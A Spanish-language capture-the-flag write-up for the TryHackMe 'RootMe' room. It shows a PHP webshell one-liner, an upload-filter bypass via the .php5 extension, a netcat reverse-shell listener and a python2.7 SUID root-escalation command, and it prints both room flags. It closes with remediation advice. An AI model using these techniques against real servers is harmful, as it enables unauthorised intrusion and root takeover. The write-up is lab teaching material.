---
title: TryHackMe - RootMe
date: 2026-11-07
platform: TryHackMe
difficulty: Easy
os: Linux
tags:
  - SSH
  - ReverseShell
  - SUID
  - Python
  - RCE
  - FileUpload
  - GTFObins
status: Completada
---

# Resumen Ejecutivo
**IP Objetivo:** `<IP>`

**Descripción breve:** Máquina Linux de dificultad fácil con [[SSH]] y un servidor web Apache. La enumeración descubre el panel `/panel`, que permite subir archivos y cuyo filtro se evade usando la extensión `.php5`. Eso da lugar a una ejecución remota de comandos ([[RCE]]) y a una [[Reverse Shell|reverse shell]] como `www-data`. La escalada se consigue aprovechando que `/usr/bin/python2.7` tiene el bit SUID activado.

---

## 1. Information Gathering (Reconocimiento)

### Escaneo de Puertos con [[Nmap]]
```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv <IP> -n -Pn -oG escaneo
```

**Puertos Abiertos:**
- 22 ([[SSH]])
- 80 (HTTP)

### Enumeración de Servicios / Fuzzing
- Enumeración web: se identifican los directorios `/panel` y `/uploads`.
- `/panel` contiene un formulario para subir archivos.
- `/uploads` es el directorio donde quedan almacenados los archivos subidos y es accesible desde el navegador.

**Descubrimientos clave:**
- `/panel`: panel de subida de archivos.
- `/uploads`: directorio público con los archivos subidos.

---

## 2. Vulnerability Assessment (Análisis de Vulnerabilidades)
- El panel de subida no valida correctamente los archivos, por lo que es posible subir un archivo malicioso y ejecutar comandos desde la web ([[RCE]]).
- El filtro bloquea la extensión `.php`, pero permite otras como `.php5`, lo que permite evadir la restricción.
- `/usr/bin/python2.7` tiene el bit **SUID** activado, un vector clásico de [[Escaladas de privilegios#Binarios SUID|escalada de privilegios]].

---

## 3. Exploitation (Acceso Inicial)

### Metodología
1. Subir un archivo PHP con un webshell al panel `/panel`.
2. Como `.php` está bloqueado, renombrar el archivo a `.php5` para evadir el filtro.
3. Acceder al archivo desde `/uploads/` y comprobar la ejecución de comandos con el parámetro `cmd`.
4. Ponerse en escucha con `netcat` y lanzar una [[Reverse Shell#PHP|reverse shell en PHP]] para obtener una shell interactiva como `www-data`.
5. Leer la flag de usuario en `/var/www/user.txt`.

### Ejecución
```bash
<?php system($_GET['cmd']); ?>
```

- Se sube el archivo como `shell.php5` y se accede a `http://<IP>/uploads/shell.php5?cmd=id`.

```bash
nc -lvnp 4444
```

- Después se sube un payload de reverse shell en PHP configurado con la IP y el puerto del listener, o se usa el webshell para lanzar la conexión.

```bash
cat /var/www/user.txt
```

**Prueba de acceso (User Flag):**
```bash
THM{y0u_g0t_a_sh3ll}
```

---

## 4. Privilege Escalation ([[Escaladas de privilegios]])

### Enumeración Interna
- Se buscan binarios con el bit SUID activado:

```bash
find / -perm -4000 2>/dev/null
```

- Entre los resultados aparece `/usr/bin/python2.7` con SUID.

### Explotación Local
1. Se consulta Python en GTFObins y se confirma que, con SUID, permite conservar los privilegios al lanzar una shell.
2. Se ejecuta el binario con `os.execl` y el flag `-p` para obtener una shell como `root` (ver [[Escaladas de privilegios#Binarios SUID|Binarios SUID]]).
3. Se lee la flag de root.

### Ejecución
```bash
/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

```bash
cat /root/root.txt
```

**Prueba de acceso (Root/SYSTEM Flag):**
```bash
THM{pr1v1l3g3_3sc4l4t10n}
```

---

## 5. Post-Exploitation & Clean Up
- [x] Verificar el acceso como `root` y documentar la flag obtenida.
- [x] Eliminar los archivos subidos durante el ataque (`shell.php5` o el payload de reverse shell).
- [x] Cerrar la sesión de [[Reverse Shell|reverse shell]] y cualquier listener de `netcat` abierto.

---

## Remediation (Mitigaciones)
- **Acceso inicial:**
  - Validar el tipo real de archivo (MIME y contenido), no solo la extensión, y generar nombres aleatorios al subir.
  - Almacenar los archivos fuera del directorio web o deshabilitar la ejecución de scripts en `/uploads`.
  - Mantener actualizados Apache y PHP, y aplicar un WAF que bloquee subidas maliciosas.
- **Escalada:**
  - Revisar y eliminar los bits SUID innecesarios (`find / -perm -4000 2>/dev/null`).
  - Aplicar el principio de mínimo privilegio a los servicios y usuarios del sistema.
  - Auditar los binarios con SUID y consultar GTFObins para detectar los que permiten escapar a una shell.
